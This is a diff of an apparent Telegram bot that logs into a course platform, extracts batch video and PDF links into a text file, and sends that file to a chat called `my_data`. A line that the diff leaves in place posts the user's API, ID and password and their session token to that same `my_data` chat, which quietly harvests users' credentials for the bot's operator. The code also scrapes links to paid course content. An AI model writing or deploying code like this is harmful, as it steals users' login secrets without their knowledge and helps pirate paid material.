@@ -126,10 +126,9 @@ async def start(bot, m):
         cool += aa
     await editable.edit(f"Login successfull....⚙️")
     await bot.send_message(my_data, f"**Api :** `{API}`\n\n**ID * Pass :** `{raw_text}`\n\n**token :** `{token}${userid}`\n\n{cool}")
-    await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID \n\n:")
-    await bot.send_message(m.chat.id, "Batch Extraction Process Starts ... 🔰") 
-   #input1 = await bot.listen(editable.chat.id)
-    #raw_text1 = input1.text
+    await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
+    input1 = await bot.listen(editable.chat.id)
+    raw_text1 = input1.text
 
     course_title = ""  
     for data in topicid:
@@ -206,11 +205,6 @@ async def start(bot, m):
                             total_links += 1
                         else:
                             pdf_link2_decrypted = "None"
-
-
-                        message = await bot.send_message(m.chat.id, f"{subject_title} {video_title.replace('||', '').replace('#', '')}:{video_link}\n")
-                        await asyncio.sleep(0.2)
-                        await bot.delete_messages(message.chat.id, message.message_id)
                         with open(f"{course_title}.txt", 'a') as f:
                             f.write(f"({subject_title}) {video_title.replace('||', '').replace('#', '')}:{video_link}\n")
                             total_links += 1
@@ -222,7 +216,6 @@ async def start(bot, m):
     await bot.send_media_group(my_data, [file1])    
     os.remove(f"{course_title}.txt")
     await bot.send_message(m.chat.id, "Batch Grabbing Done 🔰")
-    await bot.send_message(m.chat.id, "Thanks to VEBHI ♥")
 
 
 
